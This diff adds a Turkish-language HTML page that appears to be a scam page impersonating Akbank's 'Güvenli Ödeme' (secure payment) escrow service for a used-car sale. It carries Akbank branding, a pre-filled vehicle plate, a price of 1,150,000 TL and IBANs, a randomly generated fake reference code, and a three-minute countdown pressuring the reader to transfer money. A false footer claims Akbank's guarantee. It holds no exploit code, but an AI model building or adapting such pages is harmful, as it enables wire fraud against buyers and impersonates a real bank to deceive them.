@@ -1,0 +1,253 @@
+
+<!DOCTYPE html>
+
+<html lang="tr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Akbank Güvenli Ödeme</title>
+<style>
+    :root {
+      --akbank-red: #e60000;
+      --light-gray: #fefefe;
+      --white: #ffffff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--white);
+    }
+
+    header {
+      background-color: var(--white);
+      padding: 10px 0;
+      border-bottom: 1px solid #ddd;
+      text-align: center;
+    }
+
+    header img {
+      height: 48px;
+      max-width: 80%;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 500px;
+      margin: 20px auto;
+      background: var(--white);
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      color: var(--akbank-red);
+      font-size: 22px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 500;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 25px;
+      padding: 14px;
+      background: var(--akbank-red);
+      color: white;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #cc0000;
+    }
+
+    .result {
+      margin-top: 30px;
+      padding: 20px;
+      background: var(--light-gray);
+      border-left: 5px solid var(--akbank-red);
+      border-radius: 8px;
+      word-wrap: break-word;
+    }
+
+    .result h3 {
+      margin-top: 0;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      color: #fff;
+      background-color: var(--white);
+    }
+  
+
+label {
+  font-weight: 500;
+  color: #333;
+}
+
+input {
+  background-color: #f9f9f9;
+  border: 1px solid #ccc;
+}
+
+h2 {
+  font-size: 20px;
+  font-weight: 700;
+}
+
+.result p {
+  font-size: 15px;
+  line-height: 1.6;
+}
+
+button {
+  border-radius: 12px;
+  font-weight: 500;
+}
+
+footer {
+  font-weight: 400;
+  letter-spacing: 0.3px;
+}
+
+
+body::before {
+  content: "";
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background-image: url('Akbank-Logo.png');
+  background-repeat: no-repeat;
+  background-position: center;
+  background-size: 60%;
+  opacity: 1;
+  z-index: 0;
+}
+
+body, .container, header, footer {
+  position: relative;
+  z-index: 1;
+}
+
+header {
+  background-color: var(--akbank-red);
+}
+
+
+/* Ensure background image is not scroll-blocking */
+body::before {
+  pointer-events: none;
+}
+
+.container {
+  width: 95%;
+  max-width: 480px;
+  margin: 5vw auto;
+  box-sizing: border-box;
+}
+
+/* Make input elements responsive */
+input, button {
+  font-size: 16px;
+}
+
+@media (max-width: 480px) {
+  h2 {
+    font-size: 18px;
+  }
+
+  .result p, label, input, button {
+    font-size: 15px;
+  }
+
+  button {
+    padding: 12px;
+  }
+}
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/></head>
+<body>
+<header>
+<img alt="Akbank Logo" src="Akbank-Logo.png" style="height: 80px; max-width: 95%;"/>
+</header>
+<div class="container"><div style="background-color: #fff0f0; color: #a10000; font-size: 14px; padding: 12px; margin-bottom: 20px; border-left: 5px solid #e60000; border-radius: 8px; font-weight: 500;">Bu sayfa, Akbank Güvenli Ödeme işlemi için hazırlanmıştır. Lütfen bilgileri dikkatlice kontrol ediniz.</div>
+<h2>Güvenli Ödeme Başvurusu</h2>
+<form id="form">
+<label>Satıcı Adı:</label>
+<input id="sellerName" required="" type="text" value="Mevlüt Keser"/>
+<label>Satış Bedeli (TL):</label>
+<input id="amount" required="" type="number" value="1150000"/>
+<label>Araç Plakası:</label>
+<input id="plate" required="" type="text" value="34 GGT 422"/>
+<label>Satıcı IBAN:</label>
+<input id="iban" required="" type="text" value="TR330006100519786457841326"/>
+<p style="margin-top: 25px; padding: 14px; background: #ffecec; border-left: 5px solid var(--akbank-red); border-radius: 8px; font-size: 15px;">Satıcı hesabına para transferini belirtilen süre içerisinde sağlayın.</p><p id="countdown" style="font-weight: bold; font-size: 16px; margin-top: 10px;">Kalan süre: 03:00</p>
+</form>
+<div class="result" id="result" style="display:none;">
+<h3>📄 Ödeme Bilgileri</h3>
+<p><strong>Referans Kodu:</strong> <span id="refCode"></span></p>
+<p><strong>Ödeme IBAN:</strong> TR70 0004 6007 1388 8000 1013 58</p>
+<p><strong>Tutar:</strong> <span id="refAmount"></span> TL</p>
+<p style="font-size: 14px; color: #444;">
+        Lütfen bu bilgileri noter işlemi sırasında kullanın. Açıklama kısmına referans kodunu yazmayı unutmayın.
+      </p>
+</div>
+</div>
+<footer>Bu işlem, Akbank güvencesiyle gerçekleştirilmekte olup; ödeme yalnızca taraflar arası onay tamamlandığında gerçekleştirilir.</footer>
+<script>
+    window.addEventListener("load", function() {
+      const plate = "34 GGT 422";
+      const amount = "1150000";
+
+      const refCode = "0046-" + Math.floor(100 + Math.random() * 900) + "-" +
+                      plate.slice(0,2).toUpperCase() + Math.floor(Math.random() * 10000);
+
+      document.getElementById("refCode").innerText = refCode;
+      document.getElementById("refAmount").innerText = amount;
+      document.getElementById("result").style.display = "block";
+    });
+  
+    let countdownElement = document.getElementById("countdown");
+    let totalTime = 180;
+    const timer = setInterval(() => {
+      if (totalTime <= 0) {
+        clearInterval(timer);
+        countdownElement.textContent = "Süre doldu.";
+      } else {
+        totalTime--;
+        let minutes = String(Math.floor(totalTime / 60)).padStart(2, '0');
+        let seconds = String(totalTime % 60).padStart(2, '0');
+        countdownElement.textContent = `Kalan süre: ${minutes}:${seconds}`;
+      }
+    }, 1000);
+    </script>
+</body>
+</html>
